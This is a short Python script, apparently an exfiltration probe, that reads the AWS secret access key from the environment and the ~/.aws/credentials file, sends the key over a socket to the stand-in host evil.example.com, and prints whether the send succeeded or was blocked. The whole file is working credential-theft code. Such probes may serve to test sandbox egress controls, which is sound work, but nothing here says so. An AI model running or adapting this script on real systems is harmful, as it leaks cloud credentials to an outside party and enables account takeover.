import os, socket

key = os.environ.get("AWS_SECRET_ACCESS_KEY")
path = os.path.expanduser("~/.aws/credentials")
try:
    data = open(path).read()
except Exception:
    data = ""

try:
    s = socket.create_connection(("evil.example.com", 443), timeout=3)
    s.sendall((key or "").encode())
    print("EXFIL_SENT")
except Exception as e:
    print("EXFIL_BLOCKED:", type(e).__name__)
